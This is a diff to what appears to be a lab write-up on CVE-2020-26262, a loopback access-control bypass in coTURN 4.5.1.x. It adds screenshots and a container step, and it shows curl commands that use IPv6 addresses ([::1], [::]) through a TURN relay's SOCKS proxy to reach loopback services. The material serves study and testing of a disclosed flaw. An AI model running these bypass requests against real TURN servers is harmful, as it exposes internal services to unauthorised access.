@@ -1,4 +1,4 @@
-# Access Bypass
+# Relay Abuse
 - Vulnerable component: coTURN server
 - Affected version: 4.5.1.x
 - CVE ID: [CVE-2020-26262](https://nvd.nist.gov/vuln/detail/CVE-2020-26262)
@@ -41,21 +41,28 @@ In another terminal inside the stunner container, test the access control bypass
 
 **Test 1 - Standard loopback (blocked):**
 ```bash
+docker exec -it stunner sh
 curl -x socks5h://127.0.0.1:9999 http://127.0.0.1:8000
 ```
-This request is **blocked** (coTURN correctly blocks requests toward standard loopback addresses).
+This request is **blocked** (coTURN correctly blocks requests toward standard loopback addresses):
+
+![127.0.0.1](img/127.0.0.1.png)
 
 **Test 2 - IPv6 loopback bypass (VULNERABLE):**
 ```bash
 curl -x socks5h://127.0.0.1:9999 'http://[::1]:8000/'
 ```
-This request **succeeds** - the loopback protection is bypassed using IPv6 loopback address `[::1]`.
+This request **succeeds** - the loopback protection is bypassed using IPv6 loopback address `[::1]`:
+
+![::1](img/__1.png)
 
 **Test 3 - IPv6 wildcard bypass (VULNERABLE):**
 ```bash
 curl -x socks5h://127.0.0.1:9999 'http://[::]:8000/'
 ```
-This also **succeeds** - using IPv6 wildcard address `[::]` also bypasses the protection.
+This also **succeeds** - using IPv6 wildcard address `[::]` also bypasses the protection:
+
+![::](img/__.png)
 
 **Note:** The bypass using `0.0.0.0` may not work reliably on all systems due to kernel-specific TCP connection behavior.
 ## Mitigations
